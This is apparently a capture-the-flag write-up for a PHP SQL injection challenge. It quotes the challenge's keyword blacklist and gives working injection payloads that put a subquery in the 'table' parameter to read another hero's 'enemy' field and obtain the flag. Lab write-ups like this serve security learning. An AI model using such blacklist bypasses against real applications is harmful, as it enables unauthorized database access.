I first looked at the code and saw the 2 key parts that are validating the input:

```if (! is_numeric ($id) or $id < 2)```
and
```
$special1 = ["!", "\"", "#", "$", "%", "&", "'", "*", "+", "-"];
    $special2 = [".", "/", ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]"];
    $special3 = ["^", "_", "`", "{", "|", "}"];
    $sql = ["union", "0", "join", "as"];
    $blacklist = array_merge ($special1, $special2, $special3, $sql);
    foreach ($blacklist as $value) {
        if (stripos($table, $value) !== false)
```

First, I tried looking for a way to abuse the ID field, unfortunately I didn't find anything of value to bypass the is_numeric function, the only things that maybe the author of the code doesn't intend for is that it works with floats, and numbers like 01233

Then I saw the "hints" on the page, saying that the hero with ID 1 would be interesting and that each hero has an enemy. so I guessed I need to get the enemy of the hero which his ID is 1.

I then saw that even though there are a lot of disabled keywords, I can still use many other, like select, from, limit and so on.

I the started exploring with these parameters:
```user_id=2&table=(SELECT 2 id, username from costume)&submit=Submit```
And saw it works when I got the output: Batman, meaning this works.
I then expermiented with a few others and finally got this query to work:
```user_id=2&table=(SELECT 2 id, enemy username FROM costume WHERE id LIKE 1)&submit=Submit```
And then I got the flag :)
